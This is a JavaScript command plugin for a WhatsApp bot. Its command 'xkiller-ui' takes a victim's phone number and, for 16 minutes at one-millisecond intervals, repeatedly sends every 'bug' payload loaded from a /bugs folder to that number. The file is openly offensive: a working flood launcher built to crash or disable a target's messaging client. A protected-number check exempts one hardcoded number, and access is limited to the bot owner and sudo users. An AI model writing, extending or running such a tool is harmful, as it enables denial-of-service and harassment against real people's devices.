const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'xkiller-ui',
  desc: 'Send full bug flood using all payloads from /bugs for 16 minutes',
  category: 'bug',
  react: '💥',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'xkiller-ui') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, { text: '*🚫 Only owner/sudo can use this command.*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}xkiller-ui <number>`
      }, { quoted: mek });
    }

    const protectedNumbers = ['13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs folder.' }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `🚨 Launching xkiller-ui on wa.me/${targetNumber}\n🕒 Duration: 16min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
    }, { quoted: mek });

    const endTime = Date.now() + (16 * 60 * 1000);

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const bugPayload = require(`../bugs/${file}`);
          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetNumber);
          }
        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }
        await new Promise(res => setTimeout(res, 1)); // 0.001s
      }
    }

    await bot.sendMessage(from, {
      text: `✅ xkiller-ui complete on +${targetNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
